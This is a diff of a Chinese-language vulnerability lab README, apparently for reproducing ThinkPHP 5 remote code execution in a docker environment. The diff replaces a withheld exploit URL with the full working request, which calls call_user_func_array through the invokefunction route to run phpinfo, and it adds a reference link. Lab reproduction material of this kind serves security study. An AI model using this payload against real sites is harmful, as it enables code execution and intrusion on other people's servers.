@@ -6,6 +6,7 @@ ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有�
 
 - http://www.thinkphp.cn/topic/60400.html
 - http://www.thinkphp.cn/topic/60390.html
+- https://xz.aliyun.com/t/3570
 
 ## 漏洞环境
 
@@ -19,6 +20,6 @@ docker-compose up -d
 
 ## 漏洞复现
 
-直接访问`***`（暂不公开），即可执行`phpinfo()`函数：
+直接访问`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行phpinfo：
 
-![image](https://ws2.sinaimg.cn/large/400f4ee7ly1fy1zh7yiewj21290kptcu.jpg)
+![](1.png)
